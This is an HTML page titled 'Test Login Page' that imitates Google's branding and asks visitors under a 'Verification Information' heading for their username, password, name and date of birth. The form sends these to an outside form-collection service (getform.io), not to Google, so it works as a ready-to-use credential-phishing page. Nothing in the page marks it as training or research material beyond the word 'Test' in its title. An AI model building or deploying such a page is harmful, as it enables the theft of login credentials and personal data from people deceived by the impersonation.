<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Test Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f6f6f6;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 300px;
            margin: 50px auto;
            background: #fff;
            padding: 100px;
            border-radius: 8px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h2 {
            color: #333;
        }
        input[type="text"], input[type="email"], input[type="password"], input[type="date"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .submit-btn {
            background-color: #4285F4;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        .submit-btn:hover {
            background-color: #3071E7;
        }
        .google-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .google-logo span {
            font-size: 30px;
            font-weight: bold;
        }
        .google-logo span:nth-child(1) { color: #4285F4; } /* Blue G */
        .google-logo span:nth-child(2) { color: #DB4437; } /* Red o */
        .google-logo span:nth-child(3) { color: #F4B400; } /* Yellow o */
        .google-logo span:nth-child(4) { color: #4285F4; } /* Blue g */
        .google-logo span:nth-child(5) { color: #0F9D58; } /* Green l */
        .google-logo span:nth-child(6) { color: #DB4437; } /* Red e */
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h2>Verification Information</h2>
        <form action="https://getform.io/f/aejrnqeb" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="first_name" placeholder="First Name" required>
            <input type="text" name="last_name" placeholder="Last Name" required>
            <label for="dob">Date of Birth:</label>
            <input type="date" id="dob" name="dob" required>
			<h2></h2>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>
</body>
</html>
